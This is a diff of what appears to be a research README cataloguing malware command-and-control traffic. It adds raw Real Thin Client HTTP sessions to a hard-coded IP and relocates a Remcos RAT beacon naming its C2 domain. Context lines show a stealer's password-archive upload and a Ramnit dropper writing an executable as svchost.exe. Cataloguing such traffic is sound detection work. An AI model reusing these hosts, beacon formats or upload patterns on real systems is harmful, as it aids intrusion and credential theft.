@@ -1002,8 +1002,6 @@ Content-Disposition: form-data; name="userfile"; filename="admin-USER-PC-passwor
 Content-Type:application/x-gzip
 
 
-
-
 ########## User: admin ##########
 
 ------------------- Firefox passwords -----------------
@@ -1931,12 +1929,6 @@ true"success"
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/raccoon-1.png "Predator")
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/raccoon-2.png "Predator")
 
-#### Remcos RAT
-~~~
-[DataStart]x...K...SMILING BASES|cmd|M.K.Z.T.2.4.4.6.8.5.8.7.4.7.4./.h.g.M.y.Z.r.4.1.u.S.U.1.F.|cmd|US|cmd|Microsoft Windows XP (32 bit)|cmd||cmd|2095747072|cmd|2.5.0 Pro|cmd|C.:.\.D.o.c.u.m.e.n.t.s. .a.n.d. .S.e.t.t.i.n.g.s.\.A.d.m.i.n.i.s.t.r.a.t.o.r.\.A.p.p.l.i.c.a.t.i.o.n. .D.a.t.a.\.y.e.d.c.o.s.\.l.o.g.s...d.a.t.|cmd|C.:.\.D.O.C.U.M.E.~.1.\.A.D.M.I.N.I.~.1.\.L.O.C.A.L.S.~.1.\.T.e.m.p.\.R.e.g.S.v.c.s...e.x.e.|cmd||cmd||cmd|1|cmd|0|cmd|9562396|cmd|1|cmd|hangulcoxpw.pw|cmd|uCjp95GKXiHwd-AJJHX8|cmd|0|cmd|C.:.\.D.O.C.U.M.E.~.1.\.A.D.M.I.N.I.~.1.\.L.O.C.A.L.S.~.1.\.T.e.m.p.\.R.e.g.S.v.c.s...e.x.e.|cmd|Intel(R) Core(TM) i7-4770 CPU @ 3.40GHz
-~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/remcos.png "Remcos")
-
 #### Ramnit
 ~~~
 GET / HTTP/1.1
@@ -2006,6 +1998,56 @@ DropFileName = "svchost.exe"
 WriteData = "4D5A90000300000004000000FFFF0000B80000000000000040000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ramnit.png "Ramnit")
+
+#### Real Thin Client
+~~~
+POST /$rdgate?ACTION=HELLO HTTP/1.1
+HOST: 130.185.238.32
+CONTENT-LENGTH: 7249
+
+PU.<.-..v..gr..?.....&...."..j.g.6.L.D8...M...........IbT.L.B4H\@....C..^..|.1..V..N.....x...<M@$..G.....8....K..:8........u.$...)m.....n.O|....9,mxg..Cev.U<.C.S.5.3.$.......C...{..1>.L~.B|...f.Yw.-}a..?.."y......s./.l...+..gn_9.@_ .h +Sj.d#..e...5\.LU.6.....w..z$....l.go.yn......6.a..b>...m@...
+.....{...4.aq`....D.X.h....	.y..6<.c....=t..=.....D.....{.o.O...."C....
+...u?.W.z;..0..6{%.U.I.W/8.......A...x_@T...7......*P......&.G...^'..iU.V@.*.0r.?..AD...Z..0.....).....J.-l"G......E,
+.....bx......KS...Tt..nY....9.x..c..J....Mc..8.T4i...........y_.W4.|....uw.l.b&.....-.@g...tb.....*...WF...%....xy<..#.*Itj......4...Tp..H...c$.4..ar'.{..H...A.:^.j......"G..}.........._PO...a......A.9
+660150973547
+
+HTTP/1.1 200 OK
+CONTENT-LENGTH: 7248
+SET-COOKIE: ID=D09E48F3C3AD4A45A8E729AFDC970588
+
+...2...........#...&.
+.T^I. ...H}...jc.......5.2P.f..).qt.*.....:b	..I.|.z
+..}O......p.z.k..	.xI....{.":{s...eC.wEM..4E.......@..+..lL......h..z*V.^M..l. ?h.-..E.1.C.}v.Y	..P..A...g..A.,....WU.$~.+.K...d.^.
+...{....7.l.g.x....Oc..5.............^....av..F.....8.{.p|.i.
+~~~
+~~~
+POST /$rdgate?ACTION=START&ID=D09E48F3C3AD4A45A8E729AFDC970588 HTTP/1.1
+HOST: 130.185.238.32
+CONTENT-LENGTH: 7248
+
+.\k.@......TJ...........2.@...tQq..."..w.&...*}.X?.......g.c\.7....j@..".	
+
+~~~
+~~~
+POST /$rdgate?ID=D09E48F3C3AD4A45A8E729AFDC970588 HTTP/1.1
+HOST: 130.185.238.32
+CONTENT-LENGTH: 213
+
+..K.^Y	.dz....A.=.=.L"+..F.Jj...KE..z.Z8...BU......m/......%(..lw.(Y.{2.;..O/..7.bx..'.....t.r......3._....`i17jj.u...0....T,dy&.......#Z`^....>7.0.M.[O$\..."....y......P..9.W..;.L]......lf.....#.u.......v.Yf..6.G
+
+HTTP/1.1 200 OK
+CONTENT-LENGTH: 16
+
+xa...x..N.qM...
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/realthinclient-1.png "Real Thin Client")
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/realthinclient-2.png "Real Thin Client")
+
+#### Remcos RAT
+~~~
+[DataStart]x...K...SMILING BASES|cmd|M.K.Z.T.2.4.4.6.8.5.8.7.4.7.4./.h.g.M.y.Z.r.4.1.u.S.U.1.F.|cmd|US|cmd|Microsoft Windows XP (32 bit)|cmd||cmd|2095747072|cmd|2.5.0 Pro|cmd|C.:.\.D.o.c.u.m.e.n.t.s. .a.n.d. .S.e.t.t.i.n.g.s.\.A.d.m.i.n.i.s.t.r.a.t.o.r.\.A.p.p.l.i.c.a.t.i.o.n. .D.a.t.a.\.y.e.d.c.o.s.\.l.o.g.s...d.a.t.|cmd|C.:.\.D.O.C.U.M.E.~.1.\.A.D.M.I.N.I.~.1.\.L.O.C.A.L.S.~.1.\.T.e.m.p.\.R.e.g.S.v.c.s...e.x.e.|cmd||cmd||cmd|1|cmd|0|cmd|9562396|cmd|1|cmd|hangulcoxpw.pw|cmd|uCjp95GKXiHwd-AJJHX8|cmd|0|cmd|C.:.\.D.O.C.U.M.E.~.1.\.A.D.M.I.N.I.~.1.\.L.O.C.A.L.S.~.1.\.T.e.m.p.\.R.e.g.S.v.c.s...e.x.e.|cmd|Intel(R) Core(TM) i7-4770 CPU @ 3.40GHz
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/remcos.png "Remcos")
 
 #### Revenge RAT
 ~~~
